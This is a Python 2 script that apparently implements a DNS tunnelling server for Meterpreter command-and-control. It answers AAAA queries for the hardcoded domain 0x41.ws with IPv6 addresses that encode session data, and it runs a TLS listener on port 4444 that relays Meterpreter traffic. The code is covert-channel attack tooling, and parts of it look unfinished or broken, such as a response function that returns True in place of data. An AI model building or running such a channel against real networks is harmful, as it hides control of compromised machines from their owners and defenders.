#!/usr/bin/env python
# coding=utf-8

import argparse
import datetime
import sys
import time
import threading
import traceback
import SocketServer
import struct
import re
import ssl
import Queue
import copy

try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)

class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass



class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


        
class DNSTunnelResponse():
    @staticmethod
    def inc(pointer):
        lst = [ord(x) for x in list(pointer)]
        
        lst[-1] += 1
        
        if lst[-1] > 122:
            lst[-1] = 97
            
            lst[-2] += 1
            if lst[-2] > 122:
                lst[-2] = 97
                lst[-3] += 1
                if lst[-3] > 122:
                    lst[-3] = 97
                    lst[-4] += 1
                    if lst[-4] > 122:
                        lst[-4] = 97
    
        return ''.join([chr(x) for x in lst])
        
    def __init__(self, data):
        
        self.ansx = {}  # Block of IPv6 addresses
        max_size = 14 * 16
        cur_seq = 'aaaa'
        cur_seq1 = DNSTunnelResponse.inc(cur_seq)
        
        # next domain name
        ip_seq = "fe81:" + '00:'.join([hex(ord(x))[2:].zfill(2) for x in list(cur_seq1)]) +  '00:'
        
        cntx = 0
        t_size = len(data) # TLV size
        
        if t_size <= max_size:
            ip_seq += "00" # Last block
        else:
            ip_seq += "01" # More blocks will be added
            
        # overall size    
        hex_sz = (hex(t_size)[2:]).zfill(8)
        ip_seq += hex_sz[6:8] + ":" + hex_sz[4:6] + hex_sz[2:4] + ":" + hex_sz[0:2] + "00"
        
        # DNS Header added
        self.ansx[cur_seq] = []
        self.ansx[cur_seq].append(ip_seq)
        cntx += 1
        
        # Now we are going to encode data
        
        #how many IP blocks we need
        iter_big = t_size / max_size 
        if (t_size % max_size):
            iter_big += 1
            
        curr_point = 0

        for_pack = data[curr_point:max_size]
        x_size = len(for_pack)
        
        while True:
            pcs = x_size / 14
            pcs_ = x_size % 14
            
            output = list(for_pack)
            
            i = 0
            while i < pcs:
                part = []
                y = 0
                while y < 14:
                    part.append(
                      ''.join([hex(ord(x))[2:].zfill(2) for x in output[(i * 14) + y:(i * 14) + y +2]])
                    )
                    y += 2
                    
                outputX = 'ff' + hex(i)[2:].zfill(1) + 'e:' + ':'.join(part)
                self.ansx[cur_seq].append(outputX)
                cntx += 1
            
                i +=1 
            
            # Rest data 
            
            if pcs_ != 0:
                part = []
                if pcs_ % 2 != 0:
                    output2 = output[pcs * 14:(pcs * 14) + pcs_ ]
                    y = 0
                    while y < pcs_:
                        part.append(
                          ''.join([hex(ord(x))[2:].zfill(2) for x in output2[y: y +2]])
                        )
                        y += 2
                        
                    part[-1] += '00'
                    
                else:
                    output2 = output[pcs * 14:(pcs * 14)+ pcs_ + 1]
                    y = 0
                    while y < pcs_:
                        part.append(
                          ''.join([hex(ord(x))[2:].zfill(2) for x in output2[y: y +2]])
                        )
                        y += 2
                print part
                end_t = ':0000' * (7 - len(part))
                outputX = 'ff' + hex(i)[2:].zfill(1) + hex(pcs_)[2:].zfill(1) + ':' + ':'.join(part) + end_t
                self.ansx[cur_seq].append(outputX)
                cntx += 1
            t_size -= x_size
            curr_point += x_size
                
            if t_size !=0 :
                cur_seq = DNSTunnelResponse.inc(cur_seq)
                cur_seq1 = DNSTunnelResponse.inc(cur_seq)
                    
                # Next block and header
                ip_seq = 'fe81:' + '00:'.join([hex(ord(x))[2:].zfill(2) for x in list(cur_seq1)]) + '00:'
                    
                cntx = 0
                for_pack = data[curr_point:curr_point + max_size]
                x_size = len(for_pack)
                    
                if t_size <= max_size:
                    ip_seq += "03" # Last block
                else:
                    ip_seq += "02" # More blocks will be added
                    
                ip_seq += '00:0000:0000'
                self.ansx[cur_seq] = []
                self.ansx[cur_seq].append(ip_seq)
                cntx += 1
            print i
            print t_size
            if t_size == 0:
                break
        
    def get_ipv6(self):
        return self.ansx
        
D = DomainName('0x41.ws.')
IP = '54.194.143.85'
TTL = 1


#soa_record = SOA(
#    mname=D.ns1,  # primary name server
#    rname=D.msf,  # email of the domain administrator
#    times=(
#        201307231,  # serial number
#        60 * 60 * 1,  # refresh
#        60 * 60 * 3,  # retry
#        60 * 60 * 24,  # expire
#        60 * 60 * 1,  # minimum
#    )
#)

ns_records = [NS(D.ns1), NS(D.ns2)]

#records = {
#    D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
#    D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
#    D.ns2: [A(IP)],
#    D.mail: [A(IP)],
#    D.andrei: [CNAME(D)],
#}

LPORT = 4444
CONNECTED = False

servers = []

TLV_REQ = {}
TLV_RES = {}

MAX_SIZE = 14 * 16 # Maximum size of DNS reponse (IPv6)


def add_meter_request(data):
    global TLV_REQ
    
    while bool(TLV_REQ)  :
        time.sleep(0.1)
        
    TLV_REQ = DNSTunnelResponse(data).get_ipv6()   
    
    return True
    
def get_meter_response():
    while not bool(TLV_RES):
        time.sleep(0.1)
    return True
    
def dns_response(data):
    global CONNECTED
    global LPORT
    global TLV_REQ
    global TLV_RES
    
    request = DNSRecord.parse(data)

    print(request)

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]

    #if qn == D or qn.endswith('.' + D):
    #
    #    for name, rrs in records.items():
    #        if name == qn:
    #            for rdata in rrs:
    #                rqt = rdata.__class__.__name__
    #                if qt in ['*', rqt]:
    #                    reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
    #
    #    for rdata in ns_records:
    #        reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
    # 
    #    reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))

    if qn.endswith('.' + D) and qtype==QTYPE.AAAA:
        print ("Connected:" + str(CONNECTED))
        if not CONNECTED:
            servers.append(ThreadedTCPServer(('', LPORT),MeterBaseRequestHandler))
            thread = threading.Thread(target=servers[-1].serve_forever)  # that thread will start one more thread for each request
            thread.daemon = True  # exit the server thread when the main thread terminates
            thread.start()
            print("%s server loop running in thread: %s" % (servers[-1].RequestHandlerClass.__name__[:3], thread.name))
            CONNECTED = True
        print("IN REQ: " + qn)
        m = re.match(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>\w)\." + D, qn)
        if m and bool(TLV_REQ) and m.group('sub_dom') in TLV_REQ:
            print(" READY for " + m.group('sub_dom'))
            for ip in TLV_REQ[m.group('sub_dom')]:
                reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA(ip)))      
        else:
            print("Bad Request")


    elif qn.endswith(D) and qtype==QTYPE.NS:
        for rdata in ns_records:
            reply.add_answer(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
    elif qn.endswith(D) and qtype==QTYPE.A:
        reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP)))
    print("---- Reply:\n", reply)
    #reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))

    return reply.pack()


class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        print("\n\n%s DNS request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
                                               self.client_address[1]))
        try:
            data = self.get_data()
            print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
            self.send_data(dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)

class MeterBaseRequestHandler(SocketServer.BaseRequestHandler):

    def get_data(self):
        data = self.request.recv(256)
        return data

    def send_data(self, data):
        return self.request.sendall(data)

    def handle(self):
        buflen = 256
        s = ssl.wrap_socket(self.request,
          #keyfile = "server.key",
          ca_certs = "server.crt",
          cert_reqs = ssl.CERT_NONE,
          server_side=False)
         # server_side=True,
          #ssl_version=ssl.PROTOCOL_SSLv23)
        s.setblocking(False)
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        print("\n\n%s TCP request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0], self.client_address[1]))
        try:
            data = s.recv(buflen)
        except ssl.SSLError as e:
            data = None
        print "Read on empty client socket: {}".format(data)

        s.write("GET /123456789 HTTP/1.0\r\n\r\n")
        # Give client a chance to write something
        time.sleep(0.5)
        
        #Session
        while True:
            while True:
                try:
                    data = s.recv(buflen)
                except ssl.SSLError:
                    data = None
                    self.shutdown()
                    s = None
                    

                if data is None:
                    print "EMPTY"
                    break
                else:
                    print "Client said {}".format(data)
                    add_meter_request(data)
                    return_tlv = get_meter_response()                   
                    s.write(return_tlv)
            if s == None:
                break

class TCPRequestHandler(BaseRequestHandlerDNS):

    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandlerDNS):

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Magic')
    parser.add_argument('--dport', default=53, type=int, help='The DNS port to listen on.')
    parser.add_argument('--lport', default=4444, type=int, help='The Meterpreter port to listen on.')

    args = parser.parse_args()
    

    print("Starting nameserver...")

    
    servers.append(SocketServer.ThreadingUDPServer(('', args.dport), UDPRequestHandler))
    servers.append(SocketServer.ThreadingTCPServer(('', args.dport), TCPRequestHandler))
    global LPORT
    LPORT = args.lport

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()

if __name__ == '__main__':
    main()